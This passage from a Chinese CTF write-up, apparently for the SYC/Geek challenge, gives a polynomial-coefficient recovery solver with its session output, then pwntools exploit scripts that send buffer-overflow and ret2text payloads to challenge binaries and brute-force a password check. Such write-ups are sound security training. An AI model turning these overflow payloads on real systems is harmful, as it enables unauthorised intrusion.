class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    parms <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    res <span class=\"token operator\">=</span> res <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Give me x calculating f(x) :\\n> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> res <span class=\"token operator\">>=</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">32</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me something smaller.\\n\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        cnt <span class=\"token operator\">+=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span>_<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>parms<span class=\"token punctuation\">[</span>_<span class=\"token punctuation\">]</span>  </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cnt<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Give me Coefficients :\\n> '</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> ans<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">if</span> ans <span class=\"token operator\">==</span> parms<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Congrats! Your flag is:'</span><span class=\"token punctuation\">,</span>flag<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Something goes wrong...\\n\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>大系数去乘，然后以 a+xb+x**2 *c = d</p>\n<p>​\t\t\t\t\t\t\t\td%x = a</p>\n<p>​\t\t\t\t\t\t\t\t(d-a)%x**2 = x*b</p>\n<p>​\t\t\t\t\t\t\t\tb=(d-a)%x**2/x</p>\n<p>思想去写脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">177754717040592981569551572031377340054191998150089284463636682539461200861660419277793044549808255858312075085076505728657329359128807787546446926703049420827644737041142510507604014302969048704502041579803985861076553232404872140427326979171833835167928462193868397362636669260261571017153010705552082170286101066366490706565697132560168077183348017264333167651710949131724270642891881280794067160062678045612036087150089948031521050726232296861427576086790342602842186707873382193949343692973498412664984895679933538279823670239965559948652106454011062316457810423425702426952467809946501500611115441733702708710521032114459847542665622625595031556945567463443773524673751241239124703927710925044937658332481442388137350163388181450227409991519320342433196040433371356835579779793698231120173813569544459871899939201083549425467819318395410861748062368483192273232471725365632400229155722855023939343540817517380575307485589891556485415820858077584894545989502703707116260404851070263159193834020747388870400998058161372220675478753848280221136901374387028849386044822121169476710769209034711358518243519469182938739564079866844787061356058699851567858225388803202946119417521003020418983989617334074034864880878802084304236313660</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token number\">4294967295</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>coefficients <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">127</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    coefficients<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span>y<span class=\"token operator\">**</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    c <span class=\"token operator\">-=</span> coefficients<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>y<span class=\"token operator\">**</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> coef <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>coefficients<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    b<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>coef<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote Alg0r1thm_1s_s0_S1mpl3!=\"\">\n<p>sha256(XXXX+suYfKbD49Qo8nlg1) == ab021ffa2d6f8cc251b12fdec4ac9bce3d794230209d4aee1816e881a069e115<br>\nGive me XXXX: VXtD<br>\nRight!<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br>\nGive me x calculating f(x) :</p>\n<blockquote>\n<p>4294967295<br>\n177754717040592981569551572031377340054191998150089284463636682539461200861660419277793044549808255858312075085076505728657329359128807787546446926703049420827644737041142510507604014302969048704502041579803985861076553232404872140427326979171833835167928462193868397362636669260261571017153010705552082170286101066366490706565697132560168077183348017264333167651710949131724270642891881280794067160062678045612036087150089948031521050726232296861427576086790342602842186707873382193949343692973498412664984895679933538279823670239965559948652106454011062316457810423425702426952467809946501500611115441733702708710521032114459847542665622625595031556945567463443773524673751241239124703927710925044937658332481442388137350163388181450227409991519320342433196040433371356835579779793698231120173813569544459871899939201083549425467819318395410861748062368483192273232471725365632400229155722855023939343540817517380575307485589891556485415820858077584894545989502703707116260404851070263159193834020747388870400998058161372220675478753848280221136901374387028849386044822121169476710769209034711358518243519469182938739564079866844787061356058699851567858225388803202946119417521003020418983989617334074034864880878802084304236313660<br>\nGive me Coefficients :<br>\n1876237120,626172452,1627047528,1148123460,1348630515,1698481812,1446873642,4042654229,4228750952,999297977,3552395832,2965839588,2993162711,2002311193,1338287959,2340833802,2036214335,1615808961,958146830,1952401696,492154317,1317385040,537277267,3393053693,3036404066,1167705348,2797839788,1251470952,1961291670,3182242798,3808389609,2352252557,3598388818,838095969,1866892340,2674355309,1376111052,3358914062,461352865,1783381454,1993597578,1271383177,2234587463,4081359548,1689410111,4067056375,3285718523,3734989195,2508740453,2862561332,4160217917,3484830478,429421860,2404102246,4187015464,3046521226,2522208042,2138126411,292726535,4003967769,461802762,2675027708,718837678,1568030890,2846503828,4282272406,4062505778,1981908433,1283603189,4113151761,1820754298,1778870069,180426342,2373682290,173348890,3732714533,1692672433,1383715836,3071388801,1699434732,2025585879,1856716817,1482988535,507687879,2114539938,2295960531,1034475256,661384657,265513629,2619999386,909106051,2930653276,3805388808,207958940,544893102,2414669217,3137837770,812512933,2668067210,3248501708,334422578,2748607715,1766441143,1581762636,3122895940,1933908340,160370242,1114312470,66011321,4239365568,891117060,3632701542,1469123062,2873832673,1246879161,3402226432,2484827592,528672899,196357980,210761372,2432808873,146191013,2292602129,1250087457,2599643068,3549592068,2887559002,731002342<br>\nCongrats! Your flag is: SYC</p>\n</blockquote>\n</blockquote>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"nc_pwntools\"><a class=\"markdownIt-Anchor\" href=\"#nc_pwntools\">#</a> nc_pwntools</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30573</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x53\\x79\\x63\\x6c\\x6f\\x76\\x65\\x72'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> s</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'2.This challenge is harder than first one\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>equ <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>equ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"password\"><a class=\"markdownIt-Anchor\" href=\"#password\">#</a> password</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token string\">b'Wrong'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token string\">b'Wrong'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30726</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\"># io = process('./password')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x04012F3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'please enter password:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\"># sleep(0.1)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    res <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Correct'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ret2text'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote('pwn.node.game.sycsec.com',30691)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'ret2text'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>pad <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">9</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x27\\x52'</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>pl1 <span class=\"token operator\">=</span> pad <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> backdoor</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se<span class=\"token punctuation\">(</span>pl1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"write1\"><a class=\"markdownIt-Anchor\" href=\"#write1\">#</a> write1</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># r = remote('pwn.node.game.sycsec.com',30157)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token 